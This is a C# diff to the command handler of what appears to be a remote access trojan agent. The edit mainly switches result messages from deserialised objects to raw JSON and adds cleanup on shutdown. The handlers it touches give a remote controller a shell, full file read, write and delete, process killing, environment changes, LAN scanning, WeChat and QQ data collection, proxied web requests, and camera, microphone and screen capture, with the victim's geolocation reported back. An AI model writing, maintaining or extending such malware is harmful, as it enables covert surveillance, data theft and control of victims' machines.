@@ -1,5 +1,4 @@
 using System.Diagnostics;
-using System.Text.Json;
 using LibraNextgen.Agent.Communication;
 using LibraNextgen.Agent.Crypto;
 using LibraNextgen.Agent.Modules.Execution;
@@ -85,23 +84,35 @@ public class AgentEngine
                 var geoJson = await NetworkInfo.WarmupGeoAsync();
                 if (geoJson != null && _ws != null && _ws.IsConnected)
                 {
-                    await _ws.SendResultAsync("agent.geo.update", _agentId,
-                        System.Text.Json.JsonSerializer.Deserialize<object>(geoJson));
+                    await _ws.SendResultRawAsync("agent.geo.update", _agentId, geoJson);
                 }
             }
             catch { /* best-effort */ }
         });
 
         // Run heartbeat + WS receive loop in parallel
-        if (_ws != null)
+        try
         {
-            var heartbeatTask = HeartbeatLoopAsync(_cts.Token);
-            var wsTask = WsReceiveLoopAsync(_cts.Token);
-            await Task.WhenAny(heartbeatTask, wsTask);
+            if (_ws != null)
+            {
+                var heartbeatTask = HeartbeatLoopAsync(_cts.Token);
+                var wsTask = WsReceiveLoopAsync(_cts.Token);
+                await Task.WhenAny(heartbeatTask, wsTask);
+            }
+            else
+            {
+                await HeartbeatLoopAsync(_cts.Token);
+            }
         }
-        else
+        finally
         {
-            await HeartbeatLoopAsync(_cts.Token);
+            // Ensure all loops stop and resources are released
+            _cts.Cancel();
+            KillShell();
+            HandleScreenUnbind();
+            HandleCameraUnbind();
+            HandleMicUnbind();
+            _ws?.Dispose();
         }
     }
 
@@ -439,7 +450,8 @@ public class AgentEngine
 
         try
         {
-            await _ws.SendResultAsync("shell.output", _agentId, new { text });
+            var dataJson = $$"""{"text":"{{JsonEscape(text)}}"}""";
+            await _ws.SendResultRawAsync("shell.output", _agentId, dataJson);
         }
         catch { /* ignore */ }
     }
@@ -450,7 +462,11 @@ public class AgentEngine
     {
         var drives = _executor.GetDrives();
         if (_ws != null)
-            await _ws.SendResultAsync("file.drives.result", _agentId, new { drives }, msg.RequestId);
+        {
+            var escaped = drives.Select(d => $"\"{JsonEscape(d)}\"");
+            var dataJson = $"[{string.Join(",", escaped)}]";
+            await _ws.SendResultRawAsync("file.drives.result", _agentId, dataJson, msg.RequestId);
+        }
     }
 
     private async Task HandleFileList(WebSocketMessage msg, CancellationToken ct)
@@ -458,7 +474,7 @@ public class AgentEngine
         var path = msg.Data?.GetProperty("path").GetString() ?? "C:\\";
         var result = FileOps.ListDirectory(path);
         if (_ws != null)
-            await _ws.SendResultAsync("file.list.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.list.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileRead(WebSocketMessage msg, CancellationToken ct)
@@ -466,7 +482,7 @@ public class AgentEngine
         var path = msg.Data?.GetProperty("path").GetString() ?? "";
         var result = FileOps.ReadFile(path);
         if (_ws != null)
-            await _ws.SendResultAsync("file.read.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.read.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileWrite(WebSocketMessage msg, CancellationToken ct)
@@ -475,7 +491,7 @@ public class AgentEngine
         var content = msg.Data?.GetProperty("content").GetString() ?? "";
         var result = FileOps.WriteFile(path, content);
         if (_ws != null)
-            await _ws.SendResultAsync("file.write.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.write.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileDelete(WebSocketMessage msg, CancellationToken ct)
@@ -483,7 +499,7 @@ public class AgentEngine
         var path = msg.Data?.GetProperty("path").GetString() ?? "";
         var result = FileOps.DeleteFile(path);
         if (_ws != null)
-            await _ws.SendResultAsync("file.delete.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.delete.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileMkdir(WebSocketMessage msg, CancellationToken ct)
@@ -491,7 +507,7 @@ public class AgentEngine
         var path = msg.Data?.GetProperty("path").GetString() ?? "";
         var result = FileOps.CreateDirectory(path);
         if (_ws != null)
-            await _ws.SendResultAsync("file.mkdir.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.mkdir.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileRename(WebSocketMessage msg, CancellationToken ct)
@@ -500,7 +516,7 @@ public class AgentEngine
         var newName = msg.Data?.GetProperty("newName").GetString() ?? "";
         var result = FileOps.Rename(path, newName);
         if (_ws != null)
-            await _ws.SendResultAsync("file.rename.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.rename.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileMove(WebSocketMessage msg, CancellationToken ct)
@@ -509,7 +525,7 @@ public class AgentEngine
         var destination = msg.Data?.GetProperty("destination").GetString() ?? "";
         var result = FileOps.Move(source, destination);
         if (_ws != null)
-            await _ws.SendResultAsync("file.move.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.move.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileCopy(WebSocketMessage msg, CancellationToken ct)
@@ -518,7 +534,7 @@ public class AgentEngine
         var destination = msg.Data?.GetProperty("destination").GetString() ?? "";
         var result = FileOps.Copy(source, destination);
         if (_ws != null)
-            await _ws.SendResultAsync("file.copy.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.copy.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileCompress(WebSocketMessage msg, CancellationToken ct)
@@ -526,7 +542,7 @@ public class AgentEngine
         var path = msg.Data?.GetProperty("path").GetString() ?? "";
         var result = FileOps.Compress(path);
         if (_ws != null)
-            await _ws.SendResultAsync("file.compress.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.compress.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileDecompress(WebSocketMessage msg, CancellationToken ct)
@@ -536,7 +552,7 @@ public class AgentEngine
         try { destination = msg.Data?.GetProperty("destination").GetString(); } catch { }
         var result = FileOps.Decompress(path, destination);
         if (_ws != null)
-            await _ws.SendResultAsync("file.decompress.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.decompress.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleFileShortcut(WebSocketMessage msg, CancellationToken ct)
@@ -544,7 +560,7 @@ public class AgentEngine
         var path = msg.Data?.GetProperty("path").GetString() ?? "";
         var result = FileOps.CreateShortcut(path);
         if (_ws != null)
-            await _ws.SendResultAsync("file.shortcut.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("file.shortcut.result", _agentId, result, msg.RequestId);
     }
 
     // ── System info operations ──────────────────────────────────────────
@@ -555,7 +571,7 @@ public class AgentEngine
         try { lastHash = msg.Data?.GetProperty("lastHash").GetString(); } catch { }
         var result = ProcessInfo.Collect(lastHash);
         if (_ws != null)
-            await _ws.SendResultAsync("system.processes.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("system.processes.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleSystemProcessKill(WebSocketMessage msg, CancellationToken ct)
@@ -563,14 +579,17 @@ public class AgentEngine
         var pid = msg.Data?.GetProperty("pid").GetInt32() ?? 0;
         var success = ProcessInfo.Kill(pid);
         if (_ws != null)
-            await _ws.SendResultAsync("system.processes.kill.result", _agentId, new { success, pid }, msg.RequestId);
+        {
+            var dataJson = $$"""{"success":{{success.ToString().ToLowerInvariant()}},"pid":{{pid}}}""";
+            await _ws.SendResultRawAsync("system.processes.kill.result", _agentId, dataJson, msg.RequestId);
+        }
     }
 
     private async Task HandleSystemWindows(WebSocketMessage msg, CancellationToken ct)
     {
         var result = WindowInfo.Collect();
         if (_ws != null)
-            await _ws.SendResultAsync("system.windows.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("system.windows.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleSystemWindowAction(WebSocketMessage msg, string action, CancellationToken ct)
@@ -586,7 +605,7 @@ public class AgentEngine
             _ => """{"error":"Unknown action"}"""
         };
         if (_ws != null)
-            await _ws.SendResultAsync($"system.windows.{action}.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync($"system.windows.{action}.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleSystemWindowSetTitle(WebSocketMessage msg, CancellationToken ct)
@@ -595,14 +614,14 @@ public class AgentEngine
         var title = msg.Data?.GetProperty("title").GetString() ?? "";
         var result = WindowInfo.SetTitle(hwnd, title);
         if (_ws != null)
-            await _ws.SendResultAsync("system.windows.settitle.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("system.windows.settitle.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleSystemEnv(WebSocketMessage msg, CancellationToken ct)
     {
         var result = EnvInfo.Collect();
         if (_ws != null)
-            await _ws.SendResultAsync("system.env.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("system.env.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleSystemEnvSet(WebSocketMessage msg, CancellationToken ct)
@@ -612,7 +631,10 @@ public class AgentEngine
         var scope = msg.Data?.GetProperty("scope").GetString() ?? "user";
         var success = EnvInfo.Set(name, value, scope);
         if (_ws != null)
-            await _ws.SendResultAsync("system.env.set.result", _agentId, new { success }, msg.RequestId);
+        {
+            var envSetJson = $$"""{"success":{{success.ToString().ToLowerInvariant()}}}""";
+            await _ws.SendResultRawAsync("system.env.set.result", _agentId, envSetJson, msg.RequestId);
+        }
     }
 
     private async Task HandleSystemEnvDelete(WebSocketMessage msg, CancellationToken ct)
@@ -621,35 +643,38 @@ public class AgentEngine
         var scope = msg.Data?.GetProperty("scope").GetString() ?? "user";
         var success = EnvInfo.Delete(name, scope);
         if (_ws != null)
-            await _ws.SendResultAsync("system.env.delete.result", _agentId, new { success }, msg.RequestId);
+        {
+            var envDelJson = $$"""{"success":{{success.ToString().ToLowerInvariant()}}}""";
+            await _ws.SendResultRawAsync("system.env.delete.result", _agentId, envDelJson, msg.RequestId);
+        }
     }
 
     private async Task HandleSystemNetwork(WebSocketMessage msg, CancellationToken ct)
     {
         var result = await NetworkInfo.CollectAsync();
         if (_ws != null)
-            await _ws.SendResultAsync("system.network.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("system.network.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleSystemLanScan(WebSocketMessage msg, CancellationToken ct)
     {
         var result = await LanScan.ScanAsync();
         if (_ws != null)
-            await _ws.SendResultAsync("system.lanscan.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("system.lanscan.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleOtherSoftWeChat(WebSocketMessage msg, CancellationToken ct)
     {
         var result = OtherSoftware.CollectWeChat();
         if (_ws != null)
-            await _ws.SendResultAsync("othersoft.wechat.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("othersoft.wechat.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleOtherSoftQQ(WebSocketMessage msg, CancellationToken ct)
     {
         var result = OtherSoftware.CollectQQ();
         if (_ws != null)
-            await _ws.SendResultAsync("othersoft.qq.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("othersoft.qq.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleProxyFetch(WebSocketMessage msg, CancellationToken ct)
@@ -665,7 +690,7 @@ public class AgentEngine
 
         var result = await ProxyBrowser.FetchAsync(url, method, headers, body);
         if (_ws != null)
-            await _ws.SendResultAsync("proxy.fetch.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+            await _ws.SendResultRawAsync("proxy.fetch.result", _agentId, result, msg.RequestId);
     }
 
     // ── HTTP Task execution (heartbeat) ──────────────────────────────────
@@ -697,7 +722,9 @@ public class AgentEngine
                     success = true;
                     break;
                 case Common.Models.CommandType.FileDrives:
-                    output = JsonSerializer.Serialize(_executor.GetDrives());
+                    var drives = _executor.GetDrives();
+                    var escaped = drives.Select(d => $"\"{JsonEscape(d)}\"");
+                    output = $"[{string.Join(",", escaped)}]";
                     success = true;
                     break;
                 case Common.Models.CommandType.Sleep:
@@ -789,8 +816,7 @@ public class AgentEngine
     private async Task HandleCameraList(WebSocketMessage msg)
     {
         var json = CameraCapture.GetDevicesJson();
-        var data = System.Text.Json.JsonSerializer.Deserialize<object>(json);
-        await _ws!.SendResultAsync("camera.list", _agentId, data!, msg.RequestId);
+        await _ws!.SendResultRawAsync("camera.list", _agentId, json, msg.RequestId);
     }
 
     private void HandleCameraBind(WebSocketMessage msg)
@@ -834,8 +860,7 @@ public class AgentEngine
     private async Task HandleMicList(WebSocketMessage msg)
     {
         var json = MicCapture.GetDevicesJson();
-        var data = System.Text.Json.JsonSerializer.Deserialize<object>(json);
-        await _ws!.SendResultAsync("mic.list", _agentId, data!, msg.RequestId);
+        await _ws!.SendResultRawAsync("mic.list", _agentId, json, msg.RequestId);
     }
 
     private void HandleMicBind(WebSocketMessage msg)
